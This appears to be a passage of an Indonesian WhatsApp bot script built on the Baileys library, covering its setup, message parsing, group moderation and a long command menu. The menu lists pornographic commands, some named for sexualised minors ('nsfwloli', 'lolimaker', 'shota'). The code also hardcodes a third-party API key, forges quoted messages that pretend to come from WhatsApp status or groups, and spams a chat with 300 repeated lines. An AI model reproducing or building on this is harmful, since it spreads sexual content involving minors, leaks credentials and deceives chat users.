//══════════[ THQ TO ]══════════//
//*Dhaniofc
//*Nopallkh
//jangan lu ubah-ubah kontol lu cmn numpang
//jangan dijual ketahuan lu jual gw gak bakal up sc lagi gw pensi
//note:kalo mau ambil case credit nama gw di THQ TO
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
const fs = require("fs")
const axios = require('axios')
const speed = require("performance-now")
const util = require('util')
const crypto = require('crypto')
const request = require('request')
const { exec, spawn } = require('child_process')
const fetch = require('node-fetch')
const moment = require('moment-timezone')
const ffmpeg = require('fluent-ffmpeg')
const { removeBackgroundFromImageFile } = require('remove.bg')

//══════════[ Lib ]══════════//

const { fetchJosn, fetchText } = require('./lib/fetcher')
const { color, bgcolor } = require('./lib/color')
const { wait, getBuffer, h2k, generateMessageID, getGroupAdmins, getRandom, start, info, success, close } = require('./lib/functions')
const setting = JSON.parse(fs.readFileSync('./setting/setting.json'))
const apikey = JSON.parse(fs.readFileSync('./setting/apikey.json'))

//══════════[ Setting ]══════════//

dhakey = apikey.dhakey
autoread = setting.autoread
autocomposing = setting.autocomposing
autorecording = setting.autorecording
owner = setting.OwnerNumber
botname = setting.BotName
ownername = setting.OwnerName
fake = setting.Fake
gaya = setting.gaya
const fakeimage = fs.readFileSync ('./media/dhani.jpg')
const fakedhani = fs.readFileSync ('./media/thumb.jpg')

//══════════[ Data Base ]══════════//

const _antilink = JSON.parse(fs.readFileSync('./database/antilink.json'))
const _antivirtex = JSON.parse(fs.readFileSync('./database/antivirtex.json'))
const { webp2gifFile, igDownloader, TiktokDownloader } = require("./lib/gif.js")
const { wikiSearch } = require('./lib/wiki.js')
const yts = require( 'yt-search')
const ggs = require('google-it')
const brainly = require('brainly-scraper')
const { jadibot, stopjadibot, alphajadibot } = require('./lib/jadibot.js')

//══════════[ WAKTU ]══════════//

const time2 = moment().tz('Asia/Jakarta').format('HH:mm:ss')
        if(time2 < "23:59:00"){
        var ucapanWaktu = 'Selamat Malam'
}
        if(time2 < "19:00:00"){
        var ucapanWaktu = 'Selamat Petang'
}
        if(time2 < "18:00:00"){
        var ucapanWaktu = 'Selamat Sore'
}
        if(time2 < "15:00:00"){
        var ucapanWaktu = 'Selamat Siang️'
}
        if(time2 < "11:00:00"){
        var ucapanWaktu = 'Selamat Pagi'
}
        if(time2 < "05:00:00"){
        var ucapanWaktu = 'Selamat Malam'
}

//══════════[ Module Export ]══════════//
		
module.exports = Dhani = async (Dhani, mek, _welkom) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
    	mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, contactsArray, groupInviteMessage, listMessage, buttonsMessage, location, liveLocation, image, video, sticker, document, audio, product, quotedMsg } = MessageType
		const tanggal = moment.tz('Asia/Jakarta').format('dddd') + ', ' + moment.tz('Asia/Jakarta').format('LL')
		const time = moment().tz('Asia/Jakarta').format("HH:mm:ss")
		const timeMak = moment().tz('Asia/Makassar').format("HH:mm:ss");
        const timeJay = moment().tz('Asia/Jayapura').format("HH:mm:ss");
        const type = Object.keys(mek.message)[0]        
        const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
        const prefix = /^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*@,;]/.test(cmd) ? cmd.match(/^[°•π÷×¶∆£¢€¥®™=|~!#$%^&.?/\\©^z+*,;]/gi) : '#'          	
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'videoMessage') && mek.message[type].caption.startsWith(prefix) ? mek.message[type].caption : (type == 'extendedTextMessage') && mek.message[type].text.startsWith(prefix) ? mek.message[type].text : (type == 'listResponseMessage') && mek.message[type].singleSelectReply.selectedRowId ? mek.message[type].singleSelectReply.selectedRowId : (type == 'buttonsResponseMessage') && mek.message[type].selectedButtonId ? mek.message[type].selectedButtonId : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		const Verived = "0@s.whatsapp.net"
		const txt = mek.message.conversation
		const botNumber = Dhani.user.jid
		const ownerNumber = [`${owner}@s.whatsapp.net`, `6281333603591@s.whatsapp.net`]
		const isGroup = from.endsWith('@g.us')
		let sender = isGroup ? mek.participant : mek.key.remoteJid
		let senderr = mek.key.fromMe ? Dhani.user.jid : mek.key.remoteJid.endsWith('@g.us') ? mek.participant : mek.key.remoteJid
		const groupMetadata = isGroup ? await Dhani.groupMetadata(from) : ''.toString
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const senderNumber = sender.split("@")[0]
        const hour_now = moment().format('HH:mm:ss')
		const conts = mek.key.fromMe ? Dhani.user.jid : Dhani.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? Dhani.user.name : conts.notify || conts.vname || conts.name || '-'    
    
		const isAntiLink = isGroup ? _antilink.includes(from) : false
		const isWelkom = isGroup ? _welkom.includes(from) : false
		const isAntiVirtex = isGroup ? _antivirtex.includes(from) : false
		const isOwner = ownerNumber.includes(sender)
		const isMybot = isOwner || mek.key.fromMe
		let bio_nya = await Dhani.getStatus(sender)
		try {
			bio_user = `${bio_nya.status}`
		} catch {
			bio_user = '-'
			}

//══════════[ Mess Dll ]══════════//

mess = {
wait: 'Proses kak',
eror: 'Maaf terjadi kesalahan !!',
success: 'Sukses️',
error: {
stick: 'Itu bukan sticker kak !!',
Iv: 'Link invalid !!'
},
only: {
group: 'Fitur khusus grup !!',
owner: 'Fitur khusus owner !!',
admin: 'Fitur khusus admin !!',
Badmin: 'Silakan jadikan bot admin dulu !!'
}
}

//══════════[ BUTTON ]══════════//

const sendButton = async (from, context, fortext, but, mek) => {
            buttonMessages = {
                contentText: context,
                footerText: fortext,
                buttons: but,
                headerType: 1
            }
            Dhani.sendMessage(from, buttonMessages, buttonsMessage, {
                quoted: mek
            })
        }
//BUTTON TEXT//
const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
Dhani.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
//BUTTON IMAGE//
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Dhani.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
Dhani.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON VIDEO//
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await Dhani.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
Dhani.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
//BUTTON LOCATION//
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await Dhani.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
Dhani.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}

//══════════[ Fake ]══════════//

        const listmsg = (from, title, desc, list) => { // ngeread nya pake rowsId, jadi command nya ga keliatan
            let po = Dhani.prepareMessageFromContent(from, {"listMessage": {"title": title,"description": desc,"buttonText": "𝐌𝐄𝐍𝐔","footerText": `${tanggal}`,"listType": "SINGLE_SELECT","sections": list}}, {})
            return Dhani.relayWAMessage(po, {waitForAck: true})
        }
const reply = (teks) => {
Dhani.sendMessage(from, teks, text, {quoted:mek})
}
const sendMess = (hehe, teks) => {
Dhani.sendMessage(hehe, teks, text)
}
const isUrl = (url) => {
    return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }
        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? Dhani.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : Dhani.sendMessage(from, teks.trim(), extendedText, { quoted: ftrol, contextInfo: { "mentionedJid": memberr } })
        }
        const costum = (pesan, tipe, target, target2) => {
			Dhani.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participant: `${target}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}` } } })
		}
        const fakestatus = (teks) => {
            Dhani.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./media/dhani.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const fakegroup = (teks) => {
            Dhani.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": fake,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./media/dhani.jpg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
        const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${tanggal}`, 
                            orderTitle: `${botname}`,
                            thumbnail: fakedhani, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
                      
//══════════[ Storage ]══════════//

        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        Dhani.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
            const sendFileFromUrl = async(link, type, options) => {
           hasil = await getBuffer(link)
	       Dhani.sendMessage(from, hasil, type, options).catch(e => {
	       fetch(link).then((hasil) => {
	       Dhani.sendMessage(from, hasil, type, options).catch(e => {
	       Dhani.sendMessage(from, { url : link }, type, options).catch(e => {
	       reply('_[ ! ] Error Gagal Dalam Mendownload Dan Mengirim Media_')
	       console.log(e)
            })
           })
          })
         })
        }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    Dhani.sendMessage(to, media, type, { quoted: ftrol, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }  

//══════════[ Grup ]══════════//

const hideTag = async function(from, text){
           let anu = await Dhani.groupMetadata(from)
           let members = anu.participants
           let ane = []
           for (let i of members){
           ane.push(i.jid)
}
           Dhani.sendMessage(from, {text:text, jpegThumbnail:fs.readFileSync('media/dhani.jpg')}, 'extendedTextMessage', {contextInfo: {"mentionedJid": ane}})
}

//══════════[ Antilink & Antivirtex ]══════════//

if (budy.includes("https://chat.whatsapp.com/")) {
if (!isGroup) return
if (!isAntiLink) return
if (isGroupAdmins) return
var kic = `${sender.split("@")[0]}@s.whatsapp.net`
reply(` *「 GROUP LINK DETECTOR 」*\nKamu mengirimkan link grup chat, maaf kamu di kick dari grup`)
setTimeout(() => {
Dhani.groupRemove(from, [kic]).catch((e) => { reply(`BOT HARUS JADI ADMIN`) })
}, 0)
}

if (budy.length > 3500) {
if (!isGroup) return
if (!isAntiVirtex) return
if (isGroupAdmins) return
reply('Tandai telah dibaca\n'.repeat(300))
reply(`「 *VIRTEX DETECTOR* 」\n\nKamu mengirimkan virtex, maaf kamu di kick dari group`)
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
Dhani.groupRemove(from, [sender])
}     

//══════════[ Dll ]══════════//

if (autoread){
Dhani.chatRead(from, "read")
} else if (autocomposing) {
Dhani.updatePresence(from, Presence.composing)
} else if (autorecording) {
Dhani.updatePresence(from, Presence.recording)
}

		colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;31m[ PC\x1b[1;37m ]', '[\x1b[1;32m PRIBADI \x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
      	//if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
     	if (isCmd && isGroup) console.log('\x1b[1;31m[ GC\x1b[1;37m ]', '[\x1b[1;32m GROUP \x1b[1;37m]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
      	//if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
switch (command) {

//══════════[ FITUR FITURNYA ]══════════//

case 'allmenu':
case 'menu':
case 'help':
menu =
`*${ucapanWaktu} @${sender.split('@')[0]}*

_⫹⫺Library : Baileys-script_
_⫹⫺Version : 1.0.0_
_⫹⫺Language : Javascript_
_⫹⫺Author : Nopallkh_

*「 GRUP MENU 」*
${gaya} ${prefix}antilink _on / off_
${gaya} ${prefix}antivirtex _on / off_
${gaya} ${prefix}welcome _on / off_
${gaya} ${prefix}group _buka / tutup_
${gaya} ${prefix}promote _@tag / reply_
${gaya} ${prefix}demote _@tag / reply_
${gaya} ${prefix}add _628xx_
${gaya} ${prefix}kick _@tag / reply_
${gaya} ${prefix}setpp _reply_
${gaya} ${prefix}setdesc _teks_
${gaya} ${prefix}setname _teks_
${gaya} ${prefix}hidetag _teks_
${gaya} ${prefix}linkgrup
${gaya} ${prefix}infogrup
${gaya} ${prefix}listonline
${gaya} ${prefix}resetlinkgrup
${gaya} ${prefix}googlesearch _teks_
${gaya} ${prefix}wiki _teks_


*「 DOWNLOAD MENU 」*
${gaya} ${prefix}ytmp3 _Link_
${gaya} ${prefix}ytmp4 _Link_
${gaya} ${prefix}joox _Link_
${gaya} ${prefix}tiktoknowm _Link_

*「 GAME MENU 」*
${gaya} ${prefix}caklontong
${gaya} ${prefix}family100
${gaya} ${prefix}tebakbendera
${gaya} ${prefix}tebakgambar
${gaya} ${prefix}artinama
${gaya} ${prefix}suit [ _gunting/batu/kertas_ ]_

*「 MAKER MENU 」*
${gaya} ${prefix}blackpink _Teks_
${gaya} ${prefix}halloween _Teks_
${gaya} ${prefix}3dgradient _Teks_
${gaya} ${prefix}naturalleaves _Teks_
${gaya} ${prefix}dropwater _Teks_
${gaya} ${prefix}blood _Teks_
${gaya} ${prefix}blood2 _Teks_
${gaya} ${prefix}neondevil _Teks_
${gaya} ${prefix}neon _Teks_
${gaya} ${prefix}neonlight _Teks_
${gaya} ${prefix}neonlight2 _Teks_
${gaya} ${prefix}neonlight3 _Teks_
${gaya} ${prefix}greenneon _Teks_
${gaya} ${prefix}toxic _Teks_
${gaya} ${prefix}matrix _Teks_
${gaya} ${prefix}thunder _Teks_
${gaya} ${prefix}thunder2 _Teks_
${gaya} ${prefix}bokeh _Teks_
${gaya} ${prefix}carbontext _Teks_
${gaya} ${prefix}christmas _Teks_
${gaya} ${prefix}breakwall _Teks_
${gaya} ${prefix}roadwarning _Teks_
${gaya} ${prefix}engraved3d _Teks_
${gaya} ${prefix}embossed _Teks_
${gaya} ${prefix}writefoggy _Teks_
${gaya} ${prefix}3dstone _Teks_
${gaya} ${prefix}futuristic _Teks_
${gaya} ${prefix}asketch _Teks_
${gaya} ${prefix}bluecircuit _Teks_
${gaya} ${prefix}space _Teks_
${gaya} ${prefix}amagmahot _Teks_
${gaya} ${prefix}artpapercut _Teks_
${gaya} ${prefix}3dluxurygold _Teks_
${gaya} ${prefix}robotr2d2 _Teks_
${gaya} ${prefix}harrypotter _Teks_
${gaya} ${prefix}glitch3 _Teks_
${gaya} ${prefix}greenhorrorstyle _Teks_
${gaya} ${prefix}3ddeepseametal _Teks_
${gaya} ${prefix}leddisplayscreen _Teks_
${gaya} ${prefix}wonderfulgraffitiart _Teks_
${gaya} ${prefix}8bit _Teks1&Teks2_
${gaya} ${prefix}pornhub _Teks1&Teks2_
${gaya} ${prefix}glitch _Teks1&Teks2_
${gaya} ${prefix}glitch2 _Teks1&Teks2_
${gaya} ${prefix}layered _Teks1&Teks2_
${gaya} ${prefix}3dsteel _Teks1&Teks2_
${gaya} ${prefix}realistic _Teks1&Teks2_
${gaya} ${prefix}lionlogo _Teks1&Teks2_
${gaya} ${prefix}ninjalogo _Teks1&Teks2_
${gaya} ${prefix}wolf _Teks1&Teks2_
${gaya} ${prefix}wolf2 _Teks1&Teks2_
${gaya} ${prefix}halloween2 _Teks1&Teks2_
${gaya} ${prefix}marvel _Teks1&Teks2_
${gaya} ${prefix}marvel2 _Teks1&Teks2_
${gaya} ${prefix}cinematichorror _Teks1&Teks2_
${gaya} ${prefix}avengers _Teks1&Teks2_
${gaya} ${prefix}graffiti3 _Teks1&Teks2_
${gaya} ${prefix}captainamerica _Teks1&Teks2_
${gaya} ${prefix}girlneko _Teks1&Teks2_
${gaya} ${prefix}sadboy _Teks1&Teks2_
${gaya} ${prefix}kaneki _Teks1&Teks2_
${gaya} ${prefix}rem _Teks1&Teks2_
${gaya} ${prefix}lolimaker _Teks1&Teks2_
${gaya} ${prefix}gura _Teks1&Teks2_


*「 RANDOM TEXT 」*
${gaya} ${prefix}randomquotes
${gaya} ${prefix}quoteskanye
${gaya} ${prefix}quotesislami
${gaya} ${prefix}quotesanime
${gaya} ${prefix}quotes2
${gaya} ${prefix}truth
${gaya} ${prefix}dare
${gaya} ${prefix}pantun
${gaya} ${prefix}puisi
${gaya} ${prefix}faktaunik
${gaya} ${prefix}katabijak
${gaya} ${prefix}katailham
${gaya} ${prefix}katasindiran
${gaya} ${prefix}katabucin
${gaya} ${prefix}katabucin2


*「 RANDOM IMAGE 」*
${gaya} ${prefix}ppcouple
${gaya} ${prefix}meme
${gaya} ${prefix}quotesimage
${gaya} ${prefix}renungan
${gaya} ${prefix}darkjokes
${gaya} ${prefix}wallpaperhacker
${gaya} ${prefix}wallpaperharley
${gaya} ${prefix}wallpaperjoker
${gaya} ${prefix}wallpapermuslim
${gaya} ${prefix}wallpapercyberspace
${gaya} ${prefix}wallpapermountain
${gaya} ${prefix}wallpaperprogramming
${gaya} ${prefix}wallpapertechnology


*「 ASUPAN MENU 」*
${gaya} ${prefix}asupan
${gaya} ${prefix}hijaber
${gaya} ${prefix}bocil
${gaya} ${prefix}rikagusriani
${gaya} ${prefix}santuy
${gaya} ${prefix}ukhty
${gaya} ${prefix}gheayubi
${gaya} ${prefix}nantalia
${gaya} ${prefix}ghea
${gaya} ${prefix}chika
${gaya} ${prefix}mangayutri
${gaya} ${prefix}alcakenya
${gaya} ${prefix}aura
${gaya} ${prefix}delvira
${gaya} ${prefix}bunga
${gaya} ${prefix}ayu

*「 CECAN MENU 」*
${gaya} ${prefix}cogan
${gaya} ${prefix}cecan
${gaya} ${prefix}china
${gaya} ${prefix}vietnam
${gaya} ${prefix}thainlad
${gaya} ${prefix}indonesia
${gaya} ${prefix}korea
${gaya} ${prefix}japan
${gaya} ${prefix}malaysia
${gaya} ${prefix}jenni


*「 ANIME MENU 」*
${gaya} ${prefix}wallpapernaruto
${gaya} ${prefix}loli
${gaya} ${prefix}waifu
${gaya} ${prefix}neko
${gaya} ${prefix}husbu
${gaya} ${prefix}milf
${gaya} ${prefix}cosplay
${gaya} ${prefix}nekonime
${gaya} ${prefix}shota
${gaya} ${prefix}wallml
${gaya} ${prefix}megumin
${gaya} ${prefix}poke

*「 NSFW MENU 」*
${gaya} ${prefix}hentai
${gaya} ${prefix}nsfwloli
${gaya} ${prefix}nsfwneko
${gaya} ${prefix}nsfwtrap
${gaya} ${prefix}nsfwpussy
${gaya} ${prefix}nsfwyuri
${gaya} ${prefix}nsfwlesbian
${gaya} ${prefix}nsfwclassic
${gaya} ${prefix}nsfwavatar
${gaya} ${prefix}nsfwkitsune
${gaya} ${prefix}nsfwero
${gaya} ${prefix}nsfwblowjob
${gaya} ${prefix}nsfwkuni
${gaya} ${prefix}nsfwfutanari
${gaya} ${prefix}nsfwholoero
${gaya} ${prefix}nsfwholo
${gaya} ${prefix}nsfwkemonomimi
${gaya} ${prefix}nsfwketa
${gaya} ${prefix}nsfwpussyart
${gaya} ${prefix}nsfwgirlsolo
${gaya} ${prefix}nsfwanal
${gaya} ${prefix}nsfwbj
${gaya} ${prefix}nsfwtits
${gaya} ${prefix}nsfwboobs
${gaya} ${prefix}nsfwcumsluts
${gaya} ${prefix}nsfweroyuri
${gaya} ${prefix}nsfwfeet
${gaya} ${prefix}nsfwfemdom
${gaya} ${prefix}nsfwfeet
${gaya} ${prefix}nsfwcumarts
${gaya} ${prefix}nsfweroneko
${gaya} ${prefix}nsfwspank       

*「 STICKER MENU 」*
${gaya} ${prefix}sticker _reply_
${gaya} ${prefix}toimg _reply_
${gaya} ${prefix}attp _teks_

*「 NULIS MENU 」*
${gaya} ${prefix}nulis _teks_
${gaya} ${prefix}nuliskiri _teks_
${gaya} ${prefix}nuliskanan _teks_
${gaya} ${prefix}foliokiri _teks_
${gaya} ${prefix}foliokanan _teks_

*「 OWNER MENU 」*
${gaya} ${prefix}infosc
${gaya} ${prefix}owner
${gaya} ${prefix}public
${gaya} ${prefix}self
${gaya} ${prefix}bc _Teks_
${gaya} ${prefix}bc2 _Teks_`
teks =
`*${tanggal}*`
Dhani.sendMessage(from, { contentText: `${menu}`, footerText: `${teks}`, buttons: [{ buttonId: `${prefix}owner`, buttonText: { displayText: 'ᴏᴡɴᴇʀ' }, type: 1 },{ buttonId: `${prefix}sewabot`, buttonText: { displayText: 'sᴇᴡᴀʙᴏᴛ' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: fakeimage, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
var apaya = fs.readFileSync('./media/menu.mp3');

Dhani.sendMessage(from, apaya, MessageType.audio, {quoted: mek, mimetype: 'audio/mp4', ptt:true})

break
break
//══════════[ GAME MENU ]══════════//
case 'tebakbendera':
					anu = await fetchJson(`http://lolhuman.herokuapp.com/api/tebak/bendera?apikey=ae0184cfdb19e8c46728a104`, {method: 'get'})
					tebakbender = `*bendera apa ini?*\n${anu.result.flag}`
					setTimeout( () => {
					Dhani.sendMessage(from, '*Jawaban :* '+anu.result.name, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_10 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_20 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_30 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, tebakbender, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break 
                case 'tebakgambar':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/gambar?apikey=ae0184cfdb19e8c46728a104`, {method: 'get'})
					bufferkkk = await getBuffer(anu.result.image)
					setTimeout( () => {
					Dhani.sendMessage(from, '*Jawaban :* '+anu.result.answer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_10 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_20 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_30 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, bufferkkk, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break  
				case 'family100':
					anu = await fetchJson(`http://api.lolhuman.xyz/api/tebak/family100?apikey=ae0184cfdb19e8c46728a104`, {method: 'get'})
					family = `*${anu.result.question}*`
					setTimeout( () => {
					Dhani.sendMessage(from, '*Jawaban :* '+anu.result.aswer, text, {quoted: mek}) // ur cods
					}, 30000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_10 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 20000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_20 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 10000) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, '_30 Detik lagi_', text, {quoted: mek}) // ur cods
					}, 2500) // 1000 = 1s,
					setTimeout( () => {
					Dhani.sendMessage(from, family, text, {quoted: mek}) // ur cods
					}, 0) // 1000 = 1s,
					break
					case 'caklontong':
